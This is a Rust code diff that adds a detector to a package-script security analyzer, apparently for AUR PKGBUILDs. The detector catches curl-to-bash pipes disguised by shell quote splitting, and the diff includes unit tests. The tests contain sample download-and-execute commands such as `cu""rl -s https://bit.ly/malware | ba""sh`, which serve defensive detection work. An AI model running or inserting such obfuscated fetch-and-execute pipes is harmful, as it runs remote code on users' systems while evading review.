@@ -127,6 +127,7 @@ fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Sig
     let env = build_var_env(content);
     let mut signals = Vec::new();
     signals.extend(analyze_variable_resolution(content, &env));
+    signals.extend(analyze_quote_split_exec(content));
     signals.extend(analyze_indirect_execution(content, &env));
     signals.extend(analyze_charbychar_construction(content));
     signals.extend(analyze_data_blobs(content));
@@ -247,6 +248,46 @@ fn contains_multi_var_dangerous_cmd(
 }
 
 // --- Sub-Analyzers ---
+
+/// Detect download-and-execute pipes hidden by quote splitting.
+///
+/// `cu""rl -s x | ba""sh` runs `curl -s x | bash`. Stripping the quotes bash
+/// would strip anyway makes the command visible again. Only differences
+/// introduced by quote removal are reported, so an ordinary `curl x | bash`
+/// stays owned by the pattern rules rather than being reported twice.
+fn analyze_quote_split_exec(content: &str) -> Vec<Signal> {
+    let normalized = crate::shared::shell_normalize::strip_quotes(content);
+    if normalized == content {
+        return Vec::new();
+    }
+
+    let mut signals = Vec::new();
+    for (i, (original, plain)) in content.lines().zip(normalized.lines()).enumerate() {
+        if original.contains('|') == false && !original.contains('"') && !original.contains('\'') {
+            continue;
+        }
+        if let Some((dl, exec)) = contains_dangerous_pipe(plain) {
+            // Only report when quote removal is what revealed the command.
+            if contains_dangerous_pipe(original).is_none() {
+                signals.push(Signal {
+                    id: "SA-QUOTE-SPLIT-EXEC".to_string(),
+                    category: SignalCategory::Pkgbuild,
+                    points: 85,
+                    description: format!(
+                        "quote splitting resolves to '{}|{}' (line {})",
+                        dl,
+                        exec,
+                        i + 1
+                    ),
+                    is_override_gate: true,
+                    matched_line: Some(original.trim().to_string()),
+                });
+                return signals;
+            }
+        }
+    }
+    signals
+}
 
 /// Detect variable concatenation that resolves to dangerous commands.
 fn analyze_variable_resolution(
@@ -902,5 +943,37 @@ package() {
     fn install_benign_no_signals() {
         let ids = analyze_install("post_install() {\n    echo 'Done'\n}");
         assert!(ids.is_empty(), "benign install script should trigger no signals, got: {ids:?}");
+    }
+
+    // --- Quote splitting (issue #23) ---
+
+    #[test]
+    fn quote_split_curl_pipe_detected() {
+        let ids = analyze("cu\"\"rl -s https://bit.ly/malware | ba\"\"sh");
+        assert!(has(&ids, "SA-QUOTE-SPLIT-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn quote_split_single_quotes_detected() {
+        let ids = analyze("'cu'rl -s https://x/y | 'ba'sh");
+        assert!(has(&ids, "SA-QUOTE-SPLIT-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn plain_curl_pipe_not_reported_as_quote_split() {
+        let ids = analyze("curl -s https://x/y | bash");
+        assert!(!has(&ids, "SA-QUOTE-SPLIT-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn quoted_benign_command_not_reported() {
+        let ids = analyze(r#"echo "hello world" && make -j4"#);
+        assert!(!has(&ids, "SA-QUOTE-SPLIT-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn quote_split_in_install_script_prefixed() {
+        let ids = analyze_install("cu\"\"rl x | ba\"\"sh");
+        assert!(has(&ids, "IS-SA-QUOTE-SPLIT-EXEC"), "got: {ids:?}");
     }
 }
